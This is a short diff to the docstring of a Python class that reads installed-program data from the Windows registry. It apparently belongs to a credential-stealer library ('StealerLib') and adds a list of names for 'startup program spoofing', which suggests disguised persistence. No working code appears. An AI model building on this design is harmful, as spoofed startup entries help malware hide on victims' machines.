@@ -17,7 +17,8 @@ class Programs:
     """This class provides methods for extracting and parsing program-related information from the windows registry using the winreg library
 
     Attributes:
-        programs  A list of program information as a list of values or a StealerLib object for each program stored in the registry
+        programs        A list of program information as a list of values or a StealerLib object for each program stored in the registry
+        startup_names   A list of default program names to use for the startup program spoofing process
     """
 
     def __init__(self):
